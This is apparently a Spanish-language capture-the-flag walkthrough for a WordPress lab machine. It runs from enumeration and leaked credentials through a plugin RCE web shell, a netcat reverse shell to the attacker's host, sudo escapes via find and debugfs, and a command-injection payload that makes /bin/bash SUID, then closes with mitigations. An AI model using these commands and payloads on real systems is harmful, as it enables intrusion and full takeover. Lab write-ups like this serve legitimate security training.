# WHOIAM

##### Dificultad: Fácil

___

#### FASE RECONOCIMIENTO:

1. **Escaneo**:

Usaremos `nmap -n -v --open -sV -sC -Pn -oN escaneo <IP>`.  

Obtenemos:  
* el puerto 80 está abierto
* la versión es Apache 2.4.58
* el sistema objetivo es un Ubuntu

Ahora, procedemos con `whatweb <IP>` para más **Footprinting Web**. Vemos que la webapp utiliza *WordPress 6.8.3* y la librería *JQuery 3.7.1*. Podría ser de utilidad más adelante.  

2. **Enumeración Web**:  

2.1. Empezamos con los **Directorios**. Por ejemplo:  

`wfuzz -c --hc 404 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://<IP>/FUZZ"`

Encontramos:  

```
- /backups/		
- /wp-includes/
- /wp-admin/			
  - /wp-login.php?redirect_to=http%3A%2F%2F172.18.0.3%2Fwp-admin%2F&reauth=1
- /wp-content/				
- /wp-content/upgrade    	
- /wp-content/plugins    
- /wp-content/themes     
- /wp-content/uploads    	
- /wp-includes/l10n   		I
- /wp-includes/certificate
- /wp-includes/sitemaps  
- /wp-includes/widgets   
- /wp-includes/fonts     
- /wp-includes/customize 
- /wp-includes/blocks    
- /wp-includes/assets    
- /wp-includes/images    
- /wp-includes/css       
- /wp-includes/js    
```

2.2 Ahora proseguimos con los **Recursos** (*PHP-HTML-TXT*):  

`wfuzz -c --hc 404 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://<IP>/FUZZ.FUZ2Z"`  

```
- /index.php       
- /license.txt     		
- /readme.html     
- /wp-login.php    		
- /xmlrpc.php  		    	
- /wp-trackback.php
- /wp-config.php
- /wp-admin/media-new.php
```

3. Búsqueda de Vulnerabilidades:
No parecen haber, por el momento.

___

#### FASE EXPLOTACIÓN:
1. **Web**:

De dichas enumeraciónes, empezamos con `/backups`. Yendo a este endpoint vemos que podemos descargar un recurso: `databaseback2may.zip`. Lo hacemos.  

Revisamos localmente, sin extraer hasta estar seguros. Usamos `unzip -l <zip>`. Vemos que contiene un único archivito llamado `29DBMay`. Procedemos a extraerlo con `unzip <zip>`. Hacemos un `cat 29DBMay` y obtenemos las credenciales `developer:2wmy3KrGDRD%RsA7Ty5n71L^`.  

Probando con `hashid 2wmy3KrGDRD%RsA7Ty5n71L^` e investigando un poco en la web, vemos que no se trata de una *hash* válido, ni una *codificación* (como base64, etc.). Entonces, probablemente, sea la password en texto claro.  

Por lo tanto, procedemos a probar nuestras nuevas credenciales en el endpoint `/wp-login.php`, y logramos **Footholding Web**.  

2. **Sistema**:  

Navegando por el panel de WordPress, encontramos un endpoint interesante: `/wp-admin/media-new.php`. Podríamos intentar subir una *WebShell*, por ejemplo. Entonces, probamos subir cualquier archivo, nos damos cuenta que no es posible, que no tenemos permisos con `developer`.  

Entonces, hacemos más **Footprinting Web**, visualmente. Encontramos que:  

* Es un WordPress 6.8.3 (como ya sabíamos)
* Hay *Plugins* instalados como:
	* Askimet 5.3.2
	* Modern Events Calendar Lite 5.16.2

* Tiene *Temas* como:  
	*  Twenty Twenty-Four 1.1
	*  Twenty Twenty-Three 1.4
	*  Twenty Twenty-Two 1.7
			
* Hay otro usuario administrador llamado `eric`.  

Entonces, usamos la herramienta `searchsploit` para buscar **Exploits**. Después de algún tiempo, encontramos uno específico de RCE, para el **Plugin Modern Events Calendar Lite 5.16.2** de Wordpress. Lo descargamos con `searchsploit -m <ruta_exploit>`.  

Siguiendo las instrucciones del mismo, nos termina dando la URL de la webshell que acaba de subir:  
`http://<IP_Whoiam>/wp-content/uploads/shell.php`  

Nos dirigimos allí en el navegador y nos abre una [PownyWebShell](https://github.com/flozz/p0wny-shell) en el mismo. Es bastante limitada, pero ejecutamos `whoami` y nos devuelve `www-data`.  

Confirmamos **FootHolding en el Sistema**.  

2.1 **Mejorando el Entorno**  

Ahora deberíamos lanzar una **Reverse Shell**, para tener un mejor manejo local. Para ello, preparamos un **Listener**. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda a la escucha.  

Ahora, debemos ver las herramientas instaladas en el sistema para lanzar la **Conexión Reversa**. Hacemos `which python python2 python3 nc ...` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y encontramos que la manera de hacerlo, según el sistema de la víctima, es con la versión portable (POSIX) de `nc`. Ejecutamos, entonces, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`.  

Una vez lograda la conexión, tenemos mucha más funcionalidad y mejor entorno.  

___

#### FASE POST-EXPLOTACIÓN: Elevar Privilegios

Ahora sí, una vez que tenemos **FootHolding en el Sistema** hay que pensar en **Elevar Privilegios**.  

1. **Enumerar Usuarios**:  

* cat /etc/passwd
* ls -l /home/

Conseguimos 2 usuarios relevantes:  

1. rafa
2. ruben

> Ambos usan /bin/bash.  

2. Buscar **Binarios SUID** y **Privilegios Sudo**, antes de **Buscar Credenciales**:  

2.1. Corremos `find / -type f -perm -4000 2>/dev/null | xargs ls -l`. Nada interesante.  

2.2. Lanzamos `sudo -l`. Nos devuelve: `(rafa) NOPASSWD: /usr/bin/find`  

> Podemos usar `/usr/bin/find` con Privilegios Elevados como `rafa` y sin password.  

Vamos a [GTFOBins](https://gtfobins.github.io/) y buscamos `find` filtrando por `sudo`.  
Terminamos corriendo `sudo -u rafa find . -exec /bin/bash \; -quit`. Logramos **Movimiento Lateral** al usuario `rafa`.  

Ahora, desde este nuevo usuario, volvemos a ejecutar `sudo -l`: `(ruben) NOPASSWD: /usr/sbin/debugfs`.  

> Podemoos lanzar `/usr/sbin/debugfs` con Privilegios Elevados como `ruben` y sin contraseña.  

Debemos a hacer **Explotación Sudo** devuelta, para poder hacer **Movimiento Lateral** hacia `ruben`. Vamos a la *GTFOBins* nuevamente, y buscamos `debugfs`, filtrando por `sudo`.  

Terminamos lanzando `sudo -u ruben /usr/sbin/debugfs`. Nos sale un prompt y le damos a `!/bin/bash`. Ya somos `ruben`.  

Ahora,  otra vez, chequeamos los **Privilegios Sudo** con `sudo -l`. Nos devuelve: `(ALL) NOPASSWD: /bin/bash /opt/penguin.sh`  

> Podemos lanzar dicho script con Privilegios Elevados como root.  

Entonces, siguiente paso, es saber **Qué Hace el Script** para intentar explotarlo. Lo averiguamos con `cat /opt/penguin.sh`. Vemos su código:  

```
#!/bin/bash
read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```

> El script espera una entrada de texto en crudo (no interpreta los caracteres de escape como *\n*, */r*, etc). La parsea a entero en el **Bloque If**, comparándola con *42*. Si es igual devuelve "Correct", si no, "Wrong".  

Entonces, en este punto, hay que estar pensando en que la solución podría yacer en una **Inyección de Comandos por Expansión de Shell**.  

> Significa que puedo pasarle un *Comando del Sistema* insidioso para **Elevar Privilegios**.  

Por lo tanto, corro el script con `sudo -u root /bin/bash /opt/penguin.sh`, me lanza el prompt y le mando `a[$(chmod u+s /bin/bash)]+42`, por ejemplo.  

> Al querer interpretar el *Array* como un entero en el *Bloque If*, ejecuta la **Expansión de Comandos $(...)** antes de delvolver *0* (por hallar el caracter *'a'* al inicio) y compararse con *42*.  

> La orden maliciosa termina corriendo con Privilegios Elevados, dándole el **Permiso SUID** a */bin/bash*, lo cual es extremadamente peligroso.  

>  El *+42* es para que el script no dé errores, se ejecute normalmente. No es necesario. Tiene una finalidad estética.  

Ahora corremos `bash -p`, `whoami` y verificamos que somos `root`. Eso es todo.


#### MITIGACIONES:  
* Tener el sistema siempre actualizado
* Sanear las entradas en los scripts
* Seguir una política de *Zero Trust*
* Cuidar los permisos que se otorgan a los usuarios (sobre todo los SUIDs)
* No dejar las contraseñas en ficheros, y menos en texto claro
* Actualizar siempre las apps (con sus plugins, temas, etc.)
